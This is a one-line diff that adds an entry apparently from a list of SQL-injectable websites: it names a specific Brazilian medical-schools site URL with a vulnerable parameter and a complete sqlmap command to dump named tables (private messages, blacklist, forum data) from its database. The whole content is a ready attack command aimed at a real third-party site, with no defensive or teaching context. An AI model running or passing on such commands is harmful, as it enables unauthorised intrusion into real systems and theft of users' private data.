@@ -1,0 +1,1 @@
+https://www.escolasmedicas.com.br/escolas-medicas-parceiros.php?cod=21 (GET)  # sqlmap.py -u https://www.escolasmedicas.com.br/escolas-medicas-parceiros.php?cod=21 -D escolasm_escolas -T t_mensagens_lista_negra,t_mensagens_grupo_teste,t_mensagens_forum,t_mensagens_enviadas_forum,t_mensagens_enviadas,t_mensagens_dados,t_mensagens,t_livro --dump --threads=10 -v3
